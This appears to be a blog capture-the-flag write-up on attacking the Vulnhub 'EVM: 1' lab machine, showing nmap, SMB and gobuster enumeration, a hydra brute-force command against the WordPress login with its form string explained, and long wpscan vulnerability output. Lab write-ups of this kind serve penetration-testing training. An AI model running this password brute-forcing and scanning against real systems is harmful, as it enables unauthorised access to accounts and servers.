---
layout: post
title: 'EVM: 1 - Vulnhub'
date: 2022-09-10 14:59 +0300
categories: [Cybersecurity, CTF Challenges]
tags: [ctf]
---







The focus of this write-up is on outlining the process of fully compromising the "EVM: 1" host from Vulnhub.

## Nmap Results

```bash
# Nmap 7.92 scan initiated Wed Sep 08 14:08:18 2022 as: nmap -T5 -p22,53,80,110,139,143,445 -A -oA scan-all evm.cyber.range
Nmap scan report for evm.cyber.range (10.9.9.57)
Host is up (0.00050s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a2:d3:34:13:62:b1:18:a3:dd:db:35:c5:5a:b7:c0:78 (RSA)
|   256 85:48:53:2a:50:c5:a0:b7:1a:ee:a4:d8:12:8e:1c:ce (ECDSA)
|_  256 36:22:92:c7:32:22:e3:34:51:bc:0e:74:9f:1c:db:aa (ED25519)
53/tcp  open  domain      ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: RESP-CODES TOP CAPA SASL AUTH-RESP-CODE UIDL PIPELINING
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: OK post-login LITERAL+ have listed capabilities LOGIN-REFERRALS more LOGINDISABLEDA0001 SASL-IR ENABLE ID IDLE Pre-login IMAP4rev1
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3.13
OS details: Linux 3.13
Network Distance: 2 hops
Service Info: Host: UBUNTU-EXTERMELY-VULNERABLE-M4CH1INE; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h19m59s, deviation: 2h18m33s, median: 0s
| smb2-time: 
|   date: 2022-07-30T18:08:32
|_  start_date: N/A
|_nbstat: NetBIOS name: UBUNTU-EXTERMEL, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: ubuntu-extermely-vulnerable-m4ch1ine
|   NetBIOS computer name: UBUNTU-EXTERMELY-VULNERABLE-M4CH1INE\x00
|   Domain name: \x00
|   FQDN: ubuntu-extermely-vulnerable-m4ch1ine
|_  System time: 2022-07-30T14:08:32-04:00

TRACEROUTE (using port 443/tcp)
HOP RTT     ADDRESS
1   0.23 ms pfSense.cyber.range (10.0.0.1)
2   0.47 ms evm.cyber.range (10.9.9.57)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul 30 14:08:40 2022 -- 1 IP address (1 host up) scanned in 22.48 seconds

```

## Service Enumeration


### TCP/139,445


Conduct a test to enumerate anonymous SMB shares.

```bash
smbclient -L //evm.cyber.range -U '' --option="client min protocol=core"

Password for [WORKGROUP\]:

       Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (ubuntu-extermely-vulnerable-m4ch1ine server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP  
```
      
            
There doesn't seem to be anything particularly encouraging currently.

## TCP/80

There is a default Apache2 page being hosted on a Debian server. You can attempt to list the files and directories by using gobuster.

```bash
gobuster dir -u http://evm.cyber.range/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -x php,html -t 200 -o gobuster.txt -r

/.htpasswd            (Status: 403) [Size: 299]
/.htaccess            (Status: 403) [Size: 299]
/.htpasswd.php        (Status: 403) [Size: 303]
/.htpasswd.html       (Status: 403) [Size: 304]
/.htaccess.html       (Status: 403) [Size: 304]
/.htaccess.php        (Status: 403) [Size: 303]
/index.html           (Status: 200) [Size: 10821]
/info.php             (Status: 200) [Size: 82929]
/server-status        (Status: 403) [Size: 303]  
/wp-config.php        (Status: 500) [Size: 0]    
/wordpress            (Status: 200) [Size: 15076]
```

`/info.php`

![](../../assets/img/vulnhub/ev1.png)

`/wordpress`

![](../../assets/img/vulnhub/ev2.png)

Further remarks regarding the default post:

![](../../assets/img/vulnhub/ev3.png)

## Brute Force the Login

Based on the initial posts, it appears that the username "c0rrupt3d_brain" has been identified. To attempt to gain access to the site, we will use a list of passwords and try to brute force the login using this username. Start by navigating to http://evm.cyber.range/wordpress/wp-admin and attempting a failed login with "c0rrupt3d_brain:password".

![](../../assets/img/vulnhub/ev4.png)

We can examine the topmost POST request by clicking on the Payload tab and selecting "view source". This will enable us to view the web encoded values and copy them for use with hydra.

### Before

In the form payload, we observe the presence of "log=c0rrupt3d_brain" and "pwd=password" along with other parameters that are automatically provided by the web form.

```
log=c0rrupt3d_brain&pwd=password&wp-submit=Log+In&redirect_to=http%3A%2F%2Fevm.cyber.range%2Fwordpress%2Fwp-admin%2F&testcookie=1
```

### After

Modify the payload by replacing "log=^USER^" and "pwd=^PASS^" to instruct hydra on how to insert the username and password values from the wordlist(s) into the form payload. Keep everything else unchanged.

```
log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fevm.cyber.range%2Fwordpress%2Fwp-admin%2F&testcookie=1
```

Now, let's launch hydra and attempt to identify a valid password for this user:

```bash
# -I = do not use a restore file
# -f = stop when password is found
# -V = extra verbose output
# -l = single username (no wordlist)
# -P = password list
# evm.cyber.range is the hostname (IP address is OK too)
# http-post-form because we're making POST requests
# '/login/url:form-fields-here:failure_search'

hydra -IfVl c0rrupt3d_brain -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt evm.cyber.range http-post-form '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fevm.cyber.range%2Fwordpress%2Fwp-admin%2F&testcookie=1:S=302'
```

The final segment of the http-post-form may appear somewhat confusing to view.

```
/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fevm.cyber.range%2Fwordpress%2Fwp-admin%2F&testcookie=1:S=302
```

Each component within the http-post-form is delimited by a colon (:). The initial segment specifies the login URL, which in this case is /wordpress/wp-login.php. The following segment denotes the form fields, while the last segment pertains to how hydra can distinguish between successful and failed login attempts. To indicate that a login is successful when the web application responds with HTTP 302, I have utilized S=302.

![](../../assets/img/vulnhub/ev5.png)

## WPScan

In case you wish to acquire more information beyond enumeration while utilizing wpscan, obtaining a free API key would be advantageous, as it allows for up to 75 requests per day.

```bash
wpscan --url http://evm.cyber.range/wordpress -e --detection-mode aggressive --api-token your-api-token-here -o wpscan-out.txt
```

```bash
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://evm.cyber.range/wordpress/ [10.9.9.57]
[+] Started: Sun Jul 31 23:21:35 2022

Interesting Finding(s):

[+] XML-RPC seems to be enabled: http://evm.cyber.range/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://evm.cyber.range/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://evm.cyber.range/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://evm.cyber.range/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.2.4 identified (Insecure, released on 2019-10-14).
 | Found By: Atom Generator (Aggressive Detection)
 |  - http://evm.cyber.range/wordpress/index.php/feed/atom/, <generator uri="https://wordpress.org/" version="5.2.4">WordPress</generator>
 | Confirmed By: Style Etag (Aggressive Detection)
 |  - http://evm.cyber.range/wordpress/wp-admin/load-styles.php, Match: '5.2.4'
 |
 | [!] 25 vulnerabilities identified:
 |
 | [!] Title: WordPress <= 5.3 - Authenticated Improper Access Controls in REST API
 |     Fixed in: 5.2.5
 |     References:
 |      - https://wpscan.com/vulnerability/4a6de154-5fbd-4c80-acd3-8902ee431bd8
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20043
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16788
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-g7rg-hchx-c2gw
 |
 | [!] Title: WordPress <= 5.3 - Authenticated Stored XSS via Crafted Links
 |     Fixed in: 5.2.5
 |     References:
 |      - https://wpscan.com/vulnerability/23553517-34e3-40a9-a406-f3ffbe9dd265
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20042
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://hackerone.com/reports/509930
 |      - https://github.com/WordPress/wordpress-develop/commit/1f7f3f1f59567e2504f0fbebd51ccf004b3ccb1d
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-xvg2-m2f4-83m7
 |
 | [!] Title: WordPress <= 5.3 - Authenticated Stored XSS via Block Editor Content
 |     Fixed in: 5.2.5
 |     References:
 |      - https://wpscan.com/vulnerability/be794159-4486-4ae1-a5cc-5c190e5ddf5f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16781
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16780
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-pg4x-64rh-3c9v
 |
 | [!] Title: WordPress <= 5.3 - wp_kses_bad_protocol() Colon Bypass
 |     Fixed in: 5.2.5
 |     References:
 |      - https://wpscan.com/vulnerability/8fac612b-95d2-477a-a7d6-e5ec0bb9ca52
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20041
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/b1975463dd995da19bb40d3fa0786498717e3c53
 |
 | [!] Title: WordPress < 5.4.1 - Password Reset Tokens Failed to Be Properly Invalidated
 |     Fixed in: 5.2.6
 |     References:
 |      - https://wpscan.com/vulnerability/7db191c0-d112-4f08-a419-a1cd81928c4e
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11027
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47634/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-ww7v-jg8c-q6jw
 |
 | [!] Title: WordPress < 5.4.1 - Unauthenticated Users View Private Posts
 |     Fixed in: 5.2.6
 |     References:
 |      - https://wpscan.com/vulnerability/d1e1ba25-98c9-4ae7-8027-9632fb825a56
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11028
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47635/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-xhx9-759f-6p2w
 |
 | [!] Title: WordPress < 5.4.1 - Authenticated Cross-Site Scripting (XSS) in Customizer
 |     Fixed in: 5.2.6
 |     References:
 |      - https://wpscan.com/vulnerability/4eee26bd-a27e-4509-a3a5-8019dd48e429
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11025
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47633/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-4mhg-j6fx-5g3c
 |
 | [!] Title: WordPress < 5.4.1 - Authenticated Cross-Site Scripting (XSS) in Search Block
 |     Fixed in: 5.2.6
 |     References:
 |      - https://wpscan.com/vulnerability/e4bda91b-067d-45e4-a8be-672ccf8b1a06
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11030
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47636/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-vccm-6gmc-qhjh
 |
 | [!] Title: WordPress < 5.4.1 - Cross-Site Scripting (XSS) in wp-object-cache
 |     Fixed in: 5.2.6
 |     References:
 |      - https://wpscan.com/vulnerability/e721d8b9-a38f-44ac-8520-b4a9ed6a5157
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11029
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47637/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-568w-8m88-8g2c
 |
 | [!] Title: WordPress < 5.4.1 - Authenticated Cross-Site Scripting (XSS) in File Uploads
 |     Fixed in: 5.2.6
 |     References:
 |      - https://wpscan.com/vulnerability/55438b63-5fc9-4812-afc4-2f1eff800d5f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11026
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47638/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-3gw2-4656-pfr2
 |      - https://hackerone.com/reports/179695
 |
 | [!] Title: WordPress < 5.4.2 - Authenticated XSS in Block Editor
 |     Fixed in: 5.2.7
 |     References:
 |      - https://wpscan.com/vulnerability/831e4a94-239c-4061-b66e-f5ca0dbb84fa
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-4046
 |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-rpwf-hrh2-39jf
 |      - https://pentest.co.uk/labs/research/subtle-stored-xss-wordpress-core/
 |      - https://www.youtube.com/watch?v=tCh7Y8z8fb4
 |
 | [!] Title: WordPress < 5.4.2 - Authenticated XSS via Media Files
 |     Fixed in: 5.2.7
 |     References:
 |      - https://wpscan.com/vulnerability/741d07d1-2476-430a-b82f-e1228a9343a4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-4047
 |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-8q2w-5m27-wm27
 |
 | [!] Title: WordPress < 5.4.2 - Open Redirection
 |     Fixed in: 5.2.7
 |     References:
 |      - https://wpscan.com/vulnerability/12855f02-432e-4484-af09-7d0fbf596909
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-4048
 |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/10e2a50c523cf0b9785555a688d7d36a40fbeccf
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-q6pw-gvf4-5fj5
 |
 | [!] Title: WordPress < 5.4.2 - Authenticated Stored XSS via Theme Upload
 |     Fixed in: 5.2.7
 |     References:
 |      - https://wpscan.com/vulnerability/d8addb42-e70b-4439-b828-fd0697e5d9d4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-4049
 |      - https://www.exploit-db.com/exploits/48770/
 |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-87h4-phjv-rm6p
 |      - https://hackerone.com/reports/406289
 |
 | [!] Title: WordPress < 5.4.2 - Misuse of set-screen-option Leading to Privilege Escalation
 |     Fixed in: 5.2.7
 |     References:
 |      - https://wpscan.com/vulnerability/b6f69ff1-4c11-48d2-b512-c65168988c45
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-4050
 |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/dda0ccdd18f6532481406cabede19ae2ed1f575d
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-4vpv-fgg2-gcqc
 |
 | [!] Title: WordPress < 5.4.2 - Disclosure of Password-Protected Page/Post Comments
 |     Fixed in: 5.2.7
 |     References:
 |      - https://wpscan.com/vulnerability/eea6dbf5-e298-44a7-9b0d-f078ad4741f9
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-25286
 |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/c075eec24f2f3214ab0d0fb0120a23082e6b1122
 |
 | [!] Title: WordPress 4.7-5.7 - Authenticated Password Protected Pages Exposure
 |     Fixed in: 5.2.10
 |     References:
 |      - https://wpscan.com/vulnerability/6a3ec618-c79e-4b9c-9020-86b157458ac5
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29450
 |      - https://wordpress.org/news/2021/04/wordpress-5-7-1-security-and-maintenance-release/
 |      - https://blog.wpscan.com/2021/04/15/wordpress-571-security-vulnerability-release.html
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-pmmh-2f36-wvhq
 |      - https://core.trac.wordpress.org/changeset/50717/
 |      - https://www.youtube.com/watch?v=J2GXmxAdNWs
 |
 | [!] Title: WordPress 3.7 to 5.7.1 - Object Injection in PHPMailer
 |     Fixed in: 5.2.11
 |     References:
 |      - https://wpscan.com/vulnerability/4cd46653-4470-40ff-8aac-318bee2f998d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-36326
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-19296
 |      - https://github.com/WordPress/WordPress/commit/267061c9595fedd321582d14c21ec9e7da2dcf62
 |      - https://wordpress.org/news/2021/05/wordpress-5-7-2-security-release/
 |      - https://github.com/PHPMailer/PHPMailer/commit/e2e07a355ee8ff36aba21d0242c5950c56e4c6f9
 |      - https://www.wordfence.com/blog/2021/05/wordpress-5-7-2-security-release-what-you-need-to-know/
 |      - https://www.youtube.com/watch?v=HaW15aMzBUM
 |
 | [!] Title: WordPress < 5.8.2 - Expired DST Root CA X3 Certificate
 |     Fixed in: 5.2.13
 |     References:
 |      - https://wpscan.com/vulnerability/cc23344a-5c91-414a-91e3-c46db614da8d
 |      - https://wordpress.org/news/2021/11/wordpress-5-8-2-security-and-maintenance-release/
 |      - https://core.trac.wordpress.org/ticket/54207
 |
 | [!] Title: WordPress < 5.8 - Plugin Confusion
 |     Fixed in: 5.8
 |     References:
 |      - https://wpscan.com/vulnerability/95e01006-84e4-4e95-b5d7-68ea7b5aa1a8
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44223
 |      - https://vavkamil.cz/2021/11/25/wordpress-plugin-confusion-update-can-get-you-pwned/
 |
 | [!] Title: WordPress < 5.8.3 - SQL Injection via WP_Query
 |     Fixed in: 5.2.14
 |     References:
 |      - https://wpscan.com/vulnerability/7f768bcf-ed33-4b22-b432-d1e7f95c1317
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21661
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-6676-cqfm-gw84
 |      - https://hackerone.com/reports/1378209
 |
 | [!] Title: WordPress < 5.8.3 - Author+ Stored XSS via Post Slugs
 |     Fixed in: 5.2.14
 |     References:
 |      - https://wpscan.com/vulnerability/dc6f04c2-7bf2-4a07-92b5-dd197e4d94c8
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21662
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-699q-3hj9-889w
 |      - https://hackerone.com/reports/425342
 |      - https://blog.sonarsource.com/wordpress-stored-xss-vulnerability
 |
 | [!] Title: WordPress 4.1-5.8.2 - SQL Injection via WP_Meta_Query
 |     Fixed in: 5.2.14
 |     References:
 |      - https://wpscan.com/vulnerability/24462ac4-7959-4575-97aa-a6dcceeae722
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21664
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-jp3p-gw8h-6x86
 |
 | [!] Title: WordPress < 5.8.3 - Super Admin Object Injection in Multisites
 |     Fixed in: 5.2.14
 |     References:
 |      - https://wpscan.com/vulnerability/008c21ab-3d7e-4d97-b6c3-db9d83f390a7
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21663
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-jmmq-m8p8-332h
 |      - https://hackerone.com/reports/541469
 |
 | [!] Title: WordPress < 5.9.2 - Prototype Pollution in jQuery
 |     Fixed in: 5.2.15
 |     References:
 |      - https://wpscan.com/vulnerability/1ac912c1-5e29-41ac-8f76-a062de254c09
 |      - https://wordpress.org/news/2022/03/wordpress-5-9-2-security-maintenance-release/

[i] The main theme could not be detected.


[i] Plugin(s) Identified:

[+] photo-gallery
 | Location: http://evm.cyber.range/wordpress/wp-content/plugins/photo-gallery/
 | Last Updated: 2022-07-07T16:37:00.000Z
 | [!] The version is out of date, the latest version is 1.6.10
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [!] 14 vulnerabilities identified:
 |
 | [!] Title: Photo Gallery by 10Web < 1.5.35 - SQL Injection & XSS
 |     Fixed in: 1.5.35
 |     References:
 |      - https://wpscan.com/vulnerability/9875076d-e84e-4deb-a3d3-06d877b41085
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16117
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16118
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16119
 |
 | [!] Title: Photo Gallery < 1.5.46 - Multiple Cross-Site Scripting (XSS) Issues
 |     Fixed in: 1.5.46
 |     References:
 |      - https://wpscan.com/vulnerability/f626f6f7-6b90-403c-a135-37ca4d9c53e6
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-9335
 |      - https://fortiguard.com/zeroday/FG-VD-20-033
 |
 | [!] Title: Photo Gallery by 10Web < 1.5.55 - Unauthenticated SQL Injection
 |     Fixed in: 1.5.55
 |     References:
 |      - https://wpscan.com/vulnerability/2e33088e-7b93-44af-aa6a-e5d924f86e28
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24139
 |      - https://plugins.trac.wordpress.org/changeset/2304193
 |
 | [!] Title: Photo Gallery by 10Web < 1.5.68 - Reflected Cross-Site Scripting (XSS)
 |     Fixed in: 1.5.68
 |     References:
 |      - https://wpscan.com/vulnerability/32aee3ea-e0af-44da-a16c-102c83eaed8f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25041
 |      - https://plugins.trac.wordpress.org/changeset/2467205
 |      - https://packetstormsecurity.com/files/162227/
 |
 | [!] Title: Photo Gallery by 10web < 1.5.69 - Reflected Cross-Site Scripting (XSS)
 |     Fixed in: 1.5.69
 |     References:
 |      - https://wpscan.com/vulnerability/6e5f0e04-36c0-4fb6-8194-fe32c15cb3b5
 |      - https://plugins.trac.wordpress.org/changeset/2476338
 |
 | [!] Title: Photo Gallery < 1.5.69 - Multiple Reflected Cross-Site Scripting (XSS)
 |     Fixed in: 1.5.69
 |     References:
 |      - https://wpscan.com/vulnerability/cfb982b2-8b6d-4345-b3ab-3d2b130b873a
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24291
 |      - https://packetstormsecurity.com/files/162227/
 |
 | [!] Title: Photo Gallery < 1.5.67 - Authenticated Stored Cross-Site Scripting via Gallery Title
 |     Fixed in: 1.5.67
 |     References:
 |      - https://wpscan.com/vulnerability/f34096ec-b1b0-471d-88a4-4699178a3165
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24310
 |
 | [!] Title: Photo Gallery < 1.5.79 - Stored XSS via Uploaded SVG in Zip
 |     Fixed in: 1.5.79
 |     Reference: https://wpscan.com/vulnerability/a20a2ece-6c82-41c6-a21e-95e720f45584
 |
 | [!] Title: Photo Gallery < 1.5.75 - Stored Cross-Site Scripting via Uploaded SVG
 |     Fixed in: 1.5.75
 |     References:
 |      - https://wpscan.com/vulnerability/57823dcb-2149-47f7-aae2-d9f04dce851a
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24362
 |
 | [!] Title: Photo Gallery < 1.5.75 - File Upload Path Traversal
 |     Fixed in: 1.5.75
 |     References:
 |      - https://wpscan.com/vulnerability/1628935f-1d7d-4609-b7a9-e5526499c974
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24363
 |
 | [!] Title: Photo Gallery by 10Web < 1.6.0 - Unauthenticated SQL Injection
 |     Fixed in: 1.6.0
 |     References:
 |      - https://wpscan.com/vulnerability/0b4d870f-eab8-4544-91f8-9c5f0538709c
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0169
 |      - https://plugins.trac.wordpress.org/changeset/2672822/photo-gallery#file9
 |
 | [!] Title: Photo Gallery < 1.6.3 - Unauthenticated SQL Injection
 |     Fixed in: 1.6.3
 |     References:
 |      - https://wpscan.com/vulnerability/2b4866f2-f511-41c6-8135-cf1e0263d8de
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1281
 |      - https://plugins.trac.wordpress.org/changeset/2706797/photo-gallery/trunk/frontend/models/BWGModelGalleryBox.php?old=2587758&old_path=photo-gallery%2Ftrunk%2Ffrontend%2Fmodels%2FBWGModelGalleryBox.php
 |
 | [!] Title: Photo Gallery < 1.6.3 - Reflected Cross-Site Scripting
 |     Fixed in: 1.6.3
 |     References:
 |      - https://wpscan.com/vulnerability/37a58f4e-d2bc-4825-8e1b-4aaf0a1cf1b6
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1282
 |      - https://plugins.trac.wordpress.org/changeset?sfp_email=&sfph_mail=&reponame=&new=2706798%40photo-gallery&old=2694928%40photo-gallery&sfp_email=&sfph_mail=
 |
 | [!] Title: Photo Gallery < 1.6.4 - Admin+ Stored Cross-Site Scripting
 |     Fixed in: 1.6.4
 |     References:
 |      - https://wpscan.com/vulnerability/f7a0df37-3204-4926-84ec-2204a2f22de3
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1394
 |
 | Version: 1.5.34 (100% confidence)
 | Found By: Query Parameter (Passive Detection)
 |  - http://evm.cyber.range/wordpress/wp-content/plugins/photo-gallery/css/jquery.mCustomScrollbar.min.css?ver=1.5.34
 |  - http://evm.cyber.range/wordpress/wp-content/plugins/photo-gallery/css/styles.min.css?ver=1.5.34
 |  - http://evm.cyber.range/wordpress/wp-content/plugins/photo-gallery/js/jquery.mCustomScrollbar.concat.min.js?ver=1.5.34
 |  - http://evm.cyber.range/wordpress/wp-content/plugins/photo-gallery/js/scripts.min.js?ver=1.5.34
 | Confirmed By:
 |  Readme - Stable Tag (Aggressive Detection)
 |   - http://evm.cyber.range/wordpress/wp-content/plugins/photo-gallery/readme.txt
 |  Readme - ChangeLog Section (Aggressive Detection)
 |   - http://evm.cyber.range/wordpress/wp-content/plugins/photo-gallery/readme.txt


[i] No themes Found.


[i] No Timthumbs Found.


[i] No Config Backups Found.


[i] No DB Exports Found.


[i] No Medias Found.


